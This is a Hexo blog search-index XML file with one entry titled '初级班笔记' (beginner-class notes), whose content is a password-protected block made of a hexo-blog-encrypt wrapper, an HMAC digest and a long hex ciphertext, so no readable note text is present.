<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>初级班笔记</title>
    <url>/2023/03/15/%E5%88%9D%E7%BA%A7%E7%8F%AD%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 密码不对呢，为什么不去社工管理员呢？" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="381a881edd7601808ea82a6f2233b045fe65450c9a10584f6364a15ded93d1eb">e20bee337a2641907b5103abfd1719c7c595e8a8395d6c189d9a0db6e062e7e7e4ee68657ef04b270f5acdec1cc4dec85f132dafb517d5ea9cf11e0308768b9192231c32014290cbf77609e21598a9abd41a9b0afa048aa8d0c17bb2d3c94a2718ec5100bc00510da399f470c7d950893cf75247faa9ca45eab123d31d0b003cb8477f68971afe5940a2b6b9f07d9c762828ff92db17462a3f7f54a08970ee819778a3f2b44630ad134c64d254351f4677c7e503011c8ba132213f34627e08d359c8118e0d597f987dd40fc6a566fa1890ea644ce9b5e7cba5de5aaaa487b888df0d138dc90c1e042e723941c99b0dbdbc4d2eda4a9862c44726a6f838061c9281f326d14c21e0d49acfe1d0a96d9796f92b69dd17fc030d10d4b9b95fb1249dbf2ef4923276a00399c8cecb51b9e77f5d4ddc4107976fbacee2a819fb62933d02ce744b8f1e9b0f33963fe79383f93b34fb39187238c1e5ef37bb860d7cb25f5a27cf2b453eadb200957271e40985d217c9a18db2a6b4457466c6b0688deceac2648c5f16a342b2da5377889fc5f379237d4a6938b14d715247f598bf1b3546ad68d91750468c4a8791dee92d751f91e021353d383a3893af5c61444acea4aaae07521f09f0c176964e7dbf9d16012b5bce1990b7e81cbee955341b09fe81d78687274663a90630d2289d6772e11ad763dfa4348ce37ecaebfbf0c86ffbf7fa4a73467767544dea03488f7f06fde2721a2167448135314b1710929366f78848095cd96590a9dea905a816bf2ec04892c817bca782dfa2be5f82d517b100fb6515dc95aa87ea7d41c0c120ad70f2932e62ca90ec905b296dc89cb051bca628f3b7c2e1cf7d18c5fb77e4ef8b5393010feef87f8f50ad1f572a9b4f3f4c4d23fb23e3fb81dbfcb58fffb9b3ba3d3c005151d1021c9b677bed6e3dbd49cdcc11ee92d97ead574c4a55c38fe93e2bb7582184a63777bbee41032fa4e8ea3201d4bf10879de019d20b2f42c9d334be2025e878c9247fdf1696003ed68418cca5ba8dc2769015725c637eda2266a5bb4b6cb52c2974ca1f3ae7fb608d5ab5bcbb7ca4756bc42a069e053d45288953ff1bedeb793e2a2b858f326b102dbcb0f4c8fb86ae50de8dc91660b0cb898bcfe3b7b9aecc123caf4cffb6056e9cc168aa001470e0ecb7ab9edceefa0ccd920f0d10918c72cee0ddcd70df1872073d4e3f55070b1e902fd02bf27789ee3cdb795a2bf71942ce66a3d0d1fb02e40baa186b617f0152a5398f78b97de9487b9ec1accca2cb8323cc700f3410ee0c3ad8334a65c7387862af2462419ef904c17f180b47f52a1e80fc49201b61a8807773fccf33601c7aeec2a7df51375bdfda19077c3af389aa86de405bcb38d1ae69569ebc0dc44548821ca7a0be7155d88541e0598e168870552b4dda0e29d2f8fa17e9ac4f9661bb00f03fd3e91c0c6562f0671fda414ddc72f754d3458a426b697e2dcbf03028f2e2a32143029c9965af3cc1042f2de0022ef97c20e784ea72f3505e4df901ee3cb3f10c714c6357477bb02776f13346638decd2353f61f31687fe467b81d6a1ac85d2f2d9bb0a18ff8b6df8b1bd3313dde386fe1e05d9e72b80a33571c872f6594805c372eb01374b1fb05a3b0e74280511941821c99da2c56ee71ec69151e2c26a93ff0197aa4861bcaa60efb96a359c43022789ac52686da2f59cab032782e5a51150e8ef69ae190407115b23ac8a218a50a5f0b8981a67f5a84a9807d4ce5475359116ea38aba21b19c7948500dc4118268f5dea86208601acc54932937b6b35dc189b1dc83b530818f087a3f4fea71e750e892b6ce0f68cf90c4de6441ef9c1801478e37a361aec8802ae49c5db11fa4183ac004b8a8f3367cff33c0e0f5be25ffe17c7d11d5b9748bcb4036ef8a1e60d7bc2e6bfcae0ff694e950b1a41f256cd99b35867a44d674d0d5b57535a92b4140a774baa2d860051b4057c1cc71794107e8c93d4a9914d1d326afd2153ee776feca50e12aab69c278d501a20abc3861cf15178f2e871c13b0c0ce0fc6957b0253b5456236eb3ea74a30044becb015c6bae3ba0edf04f63231a582c9348eed82c70127262f066e1c7a3e0a229b13686b23bf32c4ed8210e242ab0107a57bd72ac095805ae15576f5f13bc03333f2279a26e720e15df4fff93fb663eb550aba52b87eb1b431a4efcb19cdd0035e1c7db8706a3d8a7c9e553df2e99328ea1138b5b558f64a1b4f8dd928e6cbb63f63eeddfaa8210858265ce7d874a0dbeca73da7e9b3d7825da29baf53883407e13370c08a83b64dd894d522364b0aea15fd2148a2dea70cc9109398741f262ce0c4b3e81660232f21dfa09555dbcb512c86d52d541230e2c77c4c71586bd342d2bb6a1a00dc152aa04864bf5aee68f0c3665f7e08c64eb0783bdc6f95b2c3e2262553c0a034ff3886e8c71c9c7e71237c7d09bec583fe64bbc4037419b19685d155501b935ab8fe535de070337aad737d024ceaafd8ac0dcda22c3fa76af2cc52a649996fbf3abe950555d23aa946761dfbc65c8128da6ad01aeab862644b45497b53eb4d29b8da7c216121ed4ff50e65adaf554564419cfb4555243244ef5d0a44d4952947bbdccba434557eddc794e0884d05559106a8577b0540b1b5435fdf5f5e7a68808230b2399d207bc6fb69ff01f138136af06c3a2a1386ef7b068300ff2baa38126690b0c89af83f0d901c4910d2c1d2261dd3b5d494034d1783765284b722a3854d09b7675d76454cea87221fc5cb4f0f82020e92fc541f4658408f53c540a09d29a40a5fec23481d716e8d9261ca8f4d6d6ed8673e7f988ea9445445a88f0acb5d4815f796b3925a3cf22b0435630b25765320d7733d1b99506e938d768ff521aeaca823f564669a451a84f53e91718c3960383de30e419d7a47dd56c8c0f015f8d62e28c84393863909cfa1816d2117292805cea986423e08a1f31292edfdb9e66f7a5b7c6788a4049d3b8e1785c962f060a95e0401e095ff33a60e704effbc6382aeb3f4634f7032ebf45614819ccb4ccddc2fc4fa63501a7d5dba767c6be218d0b0ecfbf0a584d42347a3c4d3c803c8a6f5cd6c8b62e5748ba776330696ed9e3a76882e81dcc4c548cdf78656fab48f194ca2e150cafba1dc28c6b356893ce1715c4ddc4ffd78ab203cabc06df6fbb5a9c0f4a923dd01e137cac4005397b5e99c736b8ab513af06049280bb9bd358d4e822781f5a758f39d2f555cee0ad408805f58cfca30968b2385406172efb3ef251e651046dd10b81f9e909ca0fa02cede727a96b5b1cf31b083a2048560507ec1d3d1a9a4da53276c15420318eb97732d6f3f163303e46df89e10f0857e368e028f0d4a56bf178887262d272c64fd3be78f5643df0f5ce407b4d648bb1a550e195cb110f3cf7b303e39ae03eb4a56621feac11486d579e40028f9f2b1c91a50c1ee6cc17652d07d8fdf76c20edaaba41f1d9630692516996b304cb2d3aec9d4a4b21b464bf2fdcf51244d47c15f7ee77cbb24521ab9854ec46ce202fbe1bab431eab552cf44d2d66711bfeb0e10ba6ef94ea1b5553dcb13987103713c173317b154f115435f0bd1cb946030471f60dbb2863363da0b6a0ba9acc3cc8a185b8eb4412cdca4a9ab2ec4108ac6da35fcac5fa66a82800e571d97e98afaa0ebcf31e11b05c869e0188e555a9dc84baf88c7803005584555bd5722a77adcc9bea7fe70de73d58908a346e8ecc21a586228278c43025940cd19bfa33933f98cd376686af4e2d394851a68a0cd10f15313f56ba9821bc746c600365f4c261700caa886465335e5b0a341b4d3ffdb8c0554c423424acb4af233fb52183ad7b9f02450882045b03196244ff8474f0d1569b5f7ad466c348985ee414017dfe2c4503414e04c9546b1b92eb96ba31f40b7a7ea34bfe6ce807714ab6049f41fa2281437828b7f27e632fde684afdd86e36f1bd981800c025e9810a0d750ac6a42c988721b22ba362fb350821e4045be35f28d2c52829936b31c53957729a99326b5cd76e2f3e8effaa83baa0eeb570893703825f35e14895dfeb4a334d3c1ed21401a54a536a2bd11412502e4505f3313a4c6aab5a269c09bb4165003c37e889bed93c66f71b7e576561ec9245355a1741cafc4eca5e4e88395cb747c1f5ca0a47f4d2c664970d51d5f9d655122dfcb9c5a55c710627e2e0e15893206c615924ff1da07132cb7cb3ebdbf72d059bcbc09f25667a0d6e2180dc879ab5b8d6ba850836292bb2435744283b32efb6ca8e22b6b419e0ffbac0874d7464fe9ebe44792cc2b4a1a4c07a1b29672d335311954ae97c94142d711fd941812265d302c81db78eef2cba375bc00a09042f7266fe755931ba380002f8f263d5d63975a648230a07deec54408c51fec490cb189486e42ca261736144b0164efe03c821a6b02365e6a74404fe5d4f6792058be9596f6fc9c42db7f91661ccc96efcb08828dd922b7185369a712dc27a254907812c8ac492455f4c9d42bb77aae0fb06cd20627e624a03077b5f5ea8cf1a536e0836a30c339ee9ecf18f0191286f882314cf9d96b212c6516e68f33f635bc291f9ae601306d235657242f36a5197c298859c742ab9f837858a907d55010c481ecafd3e3ed4eb583cd5131d19d6f96db73595def0abdecb6d14289d85c6a4ff72cf6adb61278d9217be645fb2768cb2679cbe1c08fd9801036cb1dd29ff183d585e772594e315dd92616f05032b6279d3e5dedc1fae23787dcfa4bb53ebbec1cde205a21f94e032069ec4f993cbbfa350cb63c68eddd9faabfe27eb23bbebd3f22a2cc69f9a3935a0ccb18a363ba493bc072a86622ee4d706b75b2c31855d99090c326cfe63445fccea70fd48f3a0e598a0e3401aa0e640c10ae39bd20ab164931e8064665ad66b220eca1210f5dadd418de36403ae3396fda3fa576203e5d7fd9fd860aa732c11ee64991e6bf35b9e6260b8a8991bc84cfab747388e2ea2e671e06b94a9fefd3331b624c4873b54e66b57c54761a140c4a88b9d7ea7eadbef679d61caaae0154bcd1e280b7b7d66f46579b2b321334118307f56020200bacdb1a607fc67aeaf22c7ebfad7dd146a19f05be0d3731d02fe313ba200bf988edf768f549370b402d345d9957b3cab94fd50b6778bca7f6cd531f0e1d6be957e605a1be2fae3e5aa9e1584c65ce096411a6b919108345224278f39b19ab9d13462720ba9a3a1545cf974bfd91dd232252fcf3bb55267ad99e0a613cc89ff5ca2ea3a3aeaa3bc06f8424beaf25d3e737f144cf2a314a91a634faf124bbd5eadaba683fec8dd5a6ae54cb5bd95ca0ada61382d644c999556f732f9ce5a4e0cd8a7c066e20256ba0664c1830bc7c12158fadf1ca1568c60f6fb24da4a2863a2505672acdc6b2a3b10a8d9732e8a19ad0847b4a4e94a79ab3e1edb907b3d82b2ae3501323087897c7b255cd09726224d7e334707faabc7ac08082a277419e4187a6b6e306a8aa4bcefec53720de730cc90e32c65a4ef0836f08e0a41289ccbde78b39cabc365d388076e986e9e5eabe34ae87b1f17be36b35eaa542c8c9a10738b95f2b46608aad9c107ea5c4ac2b2f5ba58e14becc3b9fa5de3638c36974f9f6448637b477f52b4f8836e37124369b9e9b5b17ead8cba31087ea88996b8807d08c3da0f8ecd2a161989559d72b2743cb61352d87c6ca1e98e43cc4009d2767a98164fb0ac85576ac6331e863600ae5f7856cc49058f29f6eb51a50cca5fd1101d5c8911a867e483d52b139c5b340c55d7759e062ae8201e48de902a840c56fcc23c3545657b25ca3b3632e1940745a10d99ac7459c281db3a093e45237d3c7790b853a95b62e0a8f27549acaed317364b06f62bfd811a6d4679b4f9408fe8040c00fbf70198b5be591bcb36ae959f2ef64d75097f1c3e26a8ab9c61d3948d56e69c89a876f3ef03bf39ded05cabef323865206666eda2560e4507f71485599f221895fc31e6942ffc81fad7f458b851a7bb8b2899f4fea7df63fc990609a4c181a5c77ac51d0a711e5c36e6411efa6a31df4b444709dbd5810d8609efa57c77846c143e2a7427287a17a7a19928d7c70d06eb6deb2f690194499e9a973cac0335bd56f8ba8376e8e1dcabe3806be7403ccebaa096b1347db20b5739bba7b43c4498c88dfada1afe972762f42c4c02abf1504bb72db0d1f7d5905582642d0e50feadb2cb85bf2b4e51d58b6678f7dfb3e4f05a87a1b67f88cde0ccf4e763e56d26c5e43c3090dad1593802c574138ec71026e4fb51fd51ed77719cc0cdd70885b1dfabb1a28c023923c87b6e3f49712377b943291ccf4df0ccb45989203b4e5eff1ce050c21b25349874cc25af04618b6d7f6ef53653e1352aa56796cc1c7a09410892029731b760e08766f995101d9409d8fa04fd667ae220fb7cd43f2e5b6e5987280f84215658b46114b1fabd1d0ca5b2102cbe426f5949755790b542f9b3719cc91b65e509425f4667d5a3ab39389305e8bcbb879a4bbc4bfda5bb43a5f8e195779e48cce93b164424a57f001fd48b7b6044c452069f86dbf186a34d31792a98283c7cf6c8b1dd1c5309affe39be001f63480687390d65ec22a95e826007a9644fc5f05857e4034335cb4b7bde27530cd11253c987204e168a09548f35a9b6c3f709494c2df745a09179b847fced12573fc6030f9d806e637a362a3d09e851fa82e8aa3aeb0dab494589cc467f42541a709fc1d5117e4212c04d68333c47a94a5c57b7ed53adb0ef5aee76203869e45f89fbf3c875f46c787044ba9fd9c05705211065f86efddac1ac424387a16a1f96f5c7a54261f37dc4adb734d7a9a4fa3f1c2de289f67acb53be54ae4bc632f815d86dadc5627feb499657f3490c6d9d0f6d61d0814ec0578d25ad6bfaf1653422877efed9b78bb02f194087636cba832aa132241d5f37b041ddb4de7a39e6048f02dc642741e15cad4765eb2bc1444de4e4c173cb9b46ac390d2478af613e9ba53cec3e5ef719844d1121e238427392f73edc8f08b09bf04975998ab0c942fe64fba3430f6f817c9324c63eff0cb048fea854d7bf171ccb52c09d5a24a1caccc73b62ed0304aab82813fb1f5ce405d519a1e3d87f9756ad3459577ee23074160bff1e522489bc539592472606109fec56982e8056c2efc7c31bc8257cd2c702a2ecc1058c48fd10f9ddb3e778ec5adce192420912077b479310785f4a5b1bbd679e339e5944d84ca91dd0d6bf9d9a6bc57cdd716fc9fe3fe59331b9a29b02901e3e814b1bea456afe2214f013edd30b293e5c8c9c97d56aa024876e63bfd11deeb1048ffccb704313ed86f60d67d37b73897df72ddc40b58c34395d21da5eeb195907c5580763aaeac0a403351a3c677f2dd9490835065acb8613d1d7ba08bfad37aae924de66bf462d3c7dceb6ee32c632c72bc6f3911edf8284fe49ba5482f2cf289f10e018747f60c64f0ccd3c73819487e3a846a6064661785faddaf7e8026b7555b7840586a616832e5b43fb6bbc54549477e5344f3b42b63ab06f608e07201fa6edaa15d0ea5127db4873b75ec4a6de27e3720bab2f416924ddda9244063a57d0026fc168ffdbdde694fc5d07c9e6f2a9bf4f6803012d1803d76f8b9796997c83d4594256a7136267c8d13e63b6ce7059696f9a7be7594d8a77d1a748f5acf0305fd50bd0c9af68b32b9891fda392125b2ea7ec5feac426a04d0f646f94455caf150f6728479f500aebfef48256988155d74756f6caf84565a3d4f717377a5b9edb0279f5734ac8b65aac57250b908b36f9702c408f186c6d11ad79b7caa80e4455e362848572e77ee67d2fa057d6b871c1f9a4d31ad87aba9ba7b23fcb8a2a5b2a273b3790173adbb224aabe064c5491341172d84bd2aea150c2071c0e2a6094b4642552fe2eb5049e13ab080075e15e02d253b6d35a60cd08543fbd70afa0639b5ad41d04308e08e87a09bb67758bee286c62c1c1b025e4647973f11678321d5278dc1004c0d81ee738def3e0f5dcc2467df4244af6d7bf455ab9c2cdda6daddbbec23de37de9095a0dceba0b313850e880e44f71ef13c23083391e85a9f48e89b999cbb4cfde8c721d7161903abfe72e1ce82022230b97256333bf0413f4acbb0b600b8d08908cd2737b67d6e3de6f7ab6edf73b11fd1483a31e3f5f9b772ca8d07140efad1e715cfa7f17affd3053d5ad2fe84feb6a8a0951bd2307348e674261a87711ede4f6eed5be208f07e32a671c2793dc0f0512f63a92d072f9e2099a9e7983c5b4876fa5f2a542db625f75790084d309edb948e372cb0fc0d621c64ccff8d1fea721c0e3e19720efb1412061e5c7b4cbc37e8a2418ca9fc8a7604db2fe81dea04aa0c3690203b6c7638b9a42a46d8d7b9926714c724528de8861a6c2076b88aedb07d0adc432a33adeb2cf681c896345f383b8f4a56faea8d73483dcc2ac82f333405e0a49e717cc44d5e701e1eb1130a794279fbf83dd9b7833b262f5870fe0a40b06be1277a7e2a8e2647ed9043cfbdcaf06db76c1063885110f7b1f48d295649c171f244c77cac6504c06cf114945ec22942b20ea9da15c99a67ef1d22e3b98c6f9b5df7765d08dce28fbd994647ba6345bc63bf2c1c51ad1de3393fdfd5c0b60a43ffafe24513d110736362bcaa54b5d3b6b3e2e2c58ffa75720391ab323c0dc0cd244a8f6a8d432f8e135a32095cb0fd27be0a6ccffeb5e678b9809667bdf6d56beb71a51be0ada92afcd2dba63b22b3271da21f1cfdf3d622312a691b6c95e81e3df6e61875a865c4ad85aa0790eb3838fe7e98caac64eef0fc70a514da7efe3b9c607e7f961ea826ef4f55dee1c37a0c912c65a504b4aef963ab7646db98f525530cf5f18821d95fc9579bf567d28795e24c8592c08be926791340b1cca2d5317dfed07d34327b361eff4f7f7fac49b9118c67255c2900222f3825f4f82c5e72dd53097b959bb708d2b2f49e4e42265102421cfb1962de9ac25ae17d5c3eb21707d5965b71e66e4db884a8d0d394a92ed3ae1d44cfb593f6e2fde78ede4d75b68d34e86695a44327245689583f2c4eb2b0ea2298ca14302206506b3d7777c1c119b755bf8c6fc13c4846988b8318975ca5494dad2caf6f72aa4f64835b9252c268bffa138c79d3776e624115009a0c2d4075cdf7db0d97eb5df0ec9480e75df116cdd868c1b1f46f9202386ee6358ab8a245e0b75a9406534f93a343382c2a208a07fc30573fc72981faac360e43b10cc6b4c3c747baf0e9c6e9323990ad2a38d16d5351c1f52d6fbbf74e4c5f2223d18c5babb80cb885c19d72f87dc1bcf703698e55e1d3af5a449f90df682704b721ba7638f6faa80e4f2b544aef5bf6757b6d4df3f3fd017eb718efcbcaf2258106401c4886ae21f2f827de4b8c9f5955d5ed4b579701a9881845d75cfac985e8487c2f2a07470197ec4c2f36f43267b6cf8479ff165df750f4ce925f364347ad56dd26d9190e7aea11824726321407d8080ab30755db40716c2905de21b04c42db86da06f90bd203cfca265529d50672deafbcf6a2325764c5416ecc6fe8cdddd09c5c966de0454cca836c3e21cb4f5b212ca18a7af276ba26ff533b25d86b7c291a9e117cfffdc92b4848a1c4813a6120e7f734ba9fd5a517690cf06141f65983326152e75de2bfeb8bd1c7e8ceb68225daa9d55ebc141ce77543fc57536eb7f6fd4436951ab052fd3f3f7d00b0f9901e405ae1600b95391815dc66537c9de53121e53d71c1218bcb2e93c0a72ae2ac8e74d2f3dbfbb3dfc4717b8c203a351fe6e16eb92b21897ced6a0fdcd1099831776e5df8e0ef669984de39e98dc55913c9158d67e69f385cd2af85781e567c9b4d8c0b3a4a39eca62f2b314d48c5ca87acd8bbfabfd104f7b0754e39d8685f8cb8ef98f68c6b4b7d84231e016528615b2df6b806c8ab8cf5d513be7106495e05e168bdd5e75458e31ff96a10e9a7d47648b2639627fd95dcd7803cf3f357fd5c66b6324b6542dd0809adea6e9eb961dc66faf67a7d4f88618bc49aedbaa091bdfac4987bbef5065083492b94bfe1b3b59b4a6489f64238f36ba319878f10c300770a2625b537753866462da2027bb157e2aaeb8b436e18790019712d166e942f6488c781b6eb1ab3c463f15e8e14c4f04ed6f9417c2edc9476877e02183bb1303847459458dd0cc2d708605204b8f4e9479e7003b32f9ec05e41915a4f9a2b5865b11d6462914fcb3a923f501e7dcc7b9f424d61f442d217cf40b94fb1a1aba413b79466483fd347103e76b521e2955d6f49b322db97c97b61470d419530802dae8d26d55cbcb139caf692486a2d6f04f90f5b44bef3bcf8406581e6f42e88b4f5003db954c94970031c44f06ee2de25406d4534247dad7dd592b19a8aa923c339fd57821ebaaaa607c6be77b22c42069bb760591a51cd6e619f3c4568f33d3d220968b3c0e4b8fe077024cac5f884ed88c39eadcb84a6937b3cdb9f400c6eb25a6f45af70463201c4bd915bd6265fa33077cd5d42350869cc508833b2e719b37473ffa891fcbdc6b46e612d9a6cac33ed441c2c3735196bd23a15170d4ef0e1c4208231c790a321598b505eebe748961694d0a58101bb8f6b2b5d0f6b405bff0b12b1ea94c31407ab63fac61b2200732d20234210b895f09dff000e47c4f05811562b95d1a89374fc72d2598228fe57dfa77093fb3c472056f9f22b15a33b817e2274b9bebb41a3d74bf73474aa7a67f024b2ee0e19dfb2e2c96283cf0e27d2f451e0cfcab9e9c65113404c2f143c7d1a66cd1d8c558a87589a9fc44b637e662119b7a0110bb96d813c5f67b5de3b64e56c12b2d2753f0ee98e0ad83037159ef38a296880008c6e5c7cd87787d3a4f5786ddf9685f24bb53d05e58bcd157492e0e0bb69e34403e9b2b4f2531f7864e01bc4b05f257348d985b921a37be53e1acc78dc3bd2d6c8e2d7686d3b096342fec8fc1470176fee1bd17abeec3b4701bb2908eeeeed910496be3840282bcc65098c5868d577ed94b6ed6137d04f80f77873f357489283a5576f5df9bb1d9100c05e51aec5798d2407ecabaf78b73ca81dd4f346bc3ac61069d8f610db375cf4ed22b86ae4209e11bd94bc24820f13f8353f65634c407dcfc30da3edc9520382fb2f093204ce97905f3a14e85396ad6cb2816dfdb10c409bd47bcac4d3eeb5dca2a1a4f15563a6d0b9e309edb936423b730f08ec9cddf777563d597b2e41c5cfac3bbe20384b842b5256e26734a1d84089c96460664646524ceb5ad7c097827b541b911d10b42ff1e84401094e889ebb4fb1e4351ca093791496a0dcb3d4106389c045dc9f1c2e73b42bb4e4df7938f537f5c798f0e39704dba7016a7a130b5c0a0d1421177b0b95981f8ce00ad80d11a1f9467808da9811470e4f563ae6f553990c73769b47bdb96203aaf74f9eae9a7cbb0ac45a2aa9dc6898e64731ef89e81febfd13f5219adfd86ebfa0b9cb12115ac226e8cdf0d238162ee83d75e9db648ee25266242e138f54e2aafaa644ee1f396ab49bd4dc81fa8d87e6b09d523bf749c4bc14327acec24d85f502e36ff69bf2c85808aae029dc241cc221539a655f22cc8b72c71308edb6c7f97fda3993e5c3310321f191efb841fe3a992ce740a46a59e1736b534bc055babfd1acaaaf26bc7e51894abed0668c0bdef406a4b39bf3d1ecb4ad5d23aa16b7a204b98350803d7e55203a456c57a6fc00391e260be612ccb66f586da0362c12d1fc09c8c773a386df9fcbacc61aa2eae2d4d0ca35586a67c64bbdb4b7193abe0c1b491e611e8ac41360c2edd128357b020a05d84464fc139a41e426ace372fe64e5fc6b8e45c8c1b35de89f7a823b9df17c0e8edc9d3ece779bcbb5bab368b55a1b907b37a7ba628fb7ef4912b6b366e3b35723a87a994e4a937a9eb92c9092dd2a2e13b7ec3ee5c700574a6a942032f98ec46b03a056335904398770f4ea1863f085ba15d5c30414eee4189b1730f12c900fdd5812d560b3b3b88d011746229ca1155dc6da05f62b04e5eb3c07740cc02438e3025762165e5f20ee72102d0bf84b38c40b0d11906954e8d44d260ad233643519cbf49d748e8d37eca190af65b04784dd812392f0ed806e38b4537b617a131e61db5bd18119d67f8f9a6ac26d7836a96adc0d6a4e5bcecdddc4f02057d22fa6e69824ff2f6113d20111f77287729501b236988a06f2d067cc90cc7854ce88b1e1db15f957aa1d190c7c856937a9558dfb38e7e91076485f151c71d88ac7106ef0a16378c93bab8a58d8bf353899985471738d7c1132b82d58553290db67cfcf7ee564d0bf6446db1401e984970b6b881d41916acfd19ff3a07729b65119a27ccdd353534fa31332a7450d5cf35cfc28e6648fda9935bdcaf76b51557c8197cb7d528422477723312fceff04939fbf61ca3fbd82c597f2ed7dc2e6885a173d3d07973696245747a860bb4d56c748a125629d13c2e41bf19e21019cfcd84f0b402d88568e5c2efa9af1c4951c087db68a82e4b6ac7ec2d2f356ae61cc23918373eec7735ce6db5fb6bedecf73bf1da5689faaf063a452ed37b553e78965fa4fdd956188dbe25172d3bc1147dd62974ed7d4ef56d23322b0d36b559d2e3fc72a816854b226663e1d514e74bbdd34bcc01cfcd0f9cbe317a77f89d75a0dd5505ac46e0fca3b08fc461c34d7a80a28346c4e5db7393e08c1100a06407fe9f78a53a10dcade230f8c22a09cf6ee75ad5db0c6d26e1ec2b96ba200c7571fcf8177e57eff800268a36ea1f40cd1fa93001a962c0744271889763b36f7e0d6ced3b06bbf672f0865d32196fa8311297585e2171551ef5db8a5875dea922112d4d2b1c8b30c57e85f5dc7758c0c9b5ed545df93b3e0d1ed177d7085529d07ffa1f24747ff25d23c875ac3d5bd8e6235c1bb62bb8d8d057a321808990029a70fb2daae6234c8cb21f37e6a0fb0050099c607d3ad4b578347e237f71922500a51d2d2a13e76ef6828d3d8c2dca86649d4f1b38ec306eecdc69a0dd1a37fa9c4ff530375362d9399dea14385ecf2c411d37248b8313219ed6b82a7c7f244f550779431c4ade6df91c4c6c88fc0eb9b5473d0003935caa7c103f3fa26e53b9a0a2eb8a9df29946130ac67df97f18cf692a0cf3e178c16680cdd9f463fd3a219149dfdd5b1ea294552570c6182f7a5a29c689b7f56f4812613443f62d5c876a350e846b82d1e9a147ca418680ce3912c26813fba6a24a7eae3d5f73475b97a1042c78b64b544b44b63515ce98d120c38461d969442c403d1777f48d09b2801c31dfb2285e8ff815dc8d7e8065bc8a51543806f54fa71e10bf6bbf9bf914f7b0cf1ceb757047e314286296e62c17cd6d1fadc274bbdc896a4251ff6a08808de608af25286abc0731a26631638fe49d7c12b476632ea02b6ae11311ebd08e0770057ce60a48b3f49921ab5cc6ab0aab1a496ae82209effef8c7e2771b4ab1397513846dd461a417a345b59c695cc9f04f586822f74167c1597b5bbe1b539aa9e96145d8ad0a8a9f417c3dd738189ce552d2dfd419b01d615dd6940c7432784e8ea61b2d7ccfca6764392c8f229e4fe0f7bd7127753e8ccb9b0ec6b3542f8d6da3fda71ea9f38b40df198f1faec686c0f6a31095858f3f7b09945c4a4b44cf232ae4c1746090eac0c2a4229d624e20ae8cb48e6890349feb5d4179b7d7a8dbb297b71f6ed955cfbdead21aa37ff8ed215511fe5d55c96eb1e48b20c1914c690e353ac3c4ac6ee419c2f4c7879f515e116211fc0b699d891cd62e66443fe7270db1671c87e38cccbc4035ac36c3e8440a178e6bc43ad021162c6f007e5e8b088d7626624655f3202c8a1319b281101bc9a5887d88cdc8fe1c9dfec9255bbdea63b4d2e13191fe00c36797e79cc530deec1e91e0a27d330b5d6b86be557cbdd57b157a31d1c044ed8b36f8f9133d9021d29d05d957b04b141abf6bb35ceed1f85590e32ea152138b087c36d10f2b0134d7c582673cc802b9760694e2575f1b07cb176f4b72852df9146a03e878c9c2730305192c827dcebb7a30af6bb4fe72641e241f38df5c67c2fdf691c1349b187534022fbb3430f011c915f2542a5dbc71eef150dcf2e3a789394494646be5b15676b3d7bfd4e88d0b1876b188e5ff1f0610d3314e6bac6dd2529b89f9e24bbec5fd48a3ddec247f4fe92c065d84f3c94b7a3b32d02367df87e72dd61ee5d0baa878bdcdc566d8227fc1322c340381350e625b20f290529d8736890fc8dbd3aac1baf23e70a1aab4f547d435c55530e836818e12a583987f0e87e7cae0e0a9801051a133f7f9f2b7af85ab4d4ffeaf2071a2467e1102bd5180357fc0639b4e9cb0d937af1f23f3fd0c9d387f16dd6617db3292db2ec9df52db9ce1275ff161555ed57d002684ce6198a284ddb7604d1e93aa116544b0ec914ee07ddeb155112d6cf6fa0df3886beb9d6965c0edd4d259bec6abe0375e86125049d7d9e13810b778504523dfb91303bbfe51061302c5fb330b20a20e993d85bfef8065164f6ecf7db4a345a7fa1593616351f1cb71a234001d82daa2641514c920a0440ff01fc65c7a9895ba250496689d2c6c70216a1dcaed2dbbed9c9f22ca28e1c0488f379e672374f526b013b7af59f41229330bb8db7d1bbeed60c5616b7fd99cdfee1bff938c33a78705864ebbbd6d097a3cb7d9d16f7e1e327344e127681ba7e3e7271a5e5543893a18d0623263839c540ca50719de653e20ed2a1841a610af25b0bef15b5eb689c382d5a90cc09bad8f03c27c5f50592235ea5444b77c25387f30d00faeabe100037e67d1598613b9b9f2ea5208aa237a0b6cc3b4145479de08aaf4a9a09854c4c1706a32e39634ae3674bc9c37d2dcf631275f7b41ad0586595c70b3237a3c75a63f82b98c19cb9bd4e503e9495b3e49908c6e71ef41fbf7799f1113ace87a30c8f49adff6a21f4400db01fb4281fa093366e7c0b117fd47fe6a798c39e6a4344e7c624523bac52f193afcb80b781edcdceca64d01976a36aabf23ee5c6d499f15d22cb70b72381726f11e014c736479e8ef49587c934dd5cd0fdba4f2a2c0080d757f83aea27a38d5a60eb9b56d3fbc065b14c3d8228c185dd7335248261184483808d0bfc9dd7df2b3265a307d4ed6fa13425a5f88978573fee490f131eefb2987bda0adab1ad2c2ecb7732b27c4a14431203ef43ed4e3539b3bbf219888401fac324dd5ebc3ca35a49384605c051c839e8679e4666d13867e278923a0da84f88a9c01c9bb01516c765a2d81af8562195dc97c00e6cfa58a31c9192879515c5cab4f9238897b419b60feb5b63c267e0b3035e21fc4333e121c2ebe6131812774d3c11650976e3dc7500e5d719b48b85d960d093a159ea6c6329bcec48e1bb6150e9e7a6179ca23c8a41faab24286e74f2e883b9cdb84e10f9a89a5bdeebb92c9164f9da00edfe8d11d2ac64894b36eeeabdeddabe179bcfad3ff0523a0aba6ff10afe91ef326a1f75e7ce76beba6be6a12b05edc64bda21140f91bec60251906e6921c712f3ea892f6c0e57b7d8ef97a0648ec42c37a7624a01473f0e060516c3f76061195e0e7e840be9d23831189f44b68e4db115c6a11dff84857c421212c32566ede226c289d6aa33c66dba0b5e239932aad21c1d55c99fcb93bb3f137f0895f852e2b950dd23455130a7e8b53694483db43ed7f89b8552a36384407c5094341efbaaae2eb2345837e000daeb34724d8f87bc9bd5bb2bc9be4d009303df7e6fbfb789adc71d8b36449d1782e40d39b8c938712cfe492bf0a181c48ec8f21c11ba2eafa910ab477c8621f7680967dc00a524c9d349e6ddb608d7a4aaf8a80cc15fa86a7fb9e954a0835fdae5b4ba91e85b466add233301b81c669f981e171f6183201431bc8299c45c6c7378edc0f7ab79a4441c92392eebfe155269213b7d4ede43762c58104db86e9681fec22bc8c5414da4fe0139000d05b436c91d927c6a9ae8bb1b67c2883a3ea3bfb13ed0a955c8ec75ef6679c8c228142e50fc9bee2